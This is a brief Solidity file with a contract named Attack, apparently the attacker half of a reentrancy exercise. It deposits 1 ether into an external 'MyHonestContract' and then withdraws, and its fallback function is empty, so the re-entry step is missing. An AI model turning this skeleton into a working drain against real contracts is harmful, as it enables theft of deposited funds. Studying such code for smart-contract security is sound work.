//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract Attack {
    MyHonestContract public honestContract;

    constructor(address _honestContractAddress){
        honestContract = MyHonestContract(_honestContractAddress);
    }

    fallback() external payable {

    }

    function attck() external payable {
        require(msg.value >= 1 ether );
        honestContract.deposit{value: 1 ether}();
        honestContract.withdraw(1 ether);
    }
}
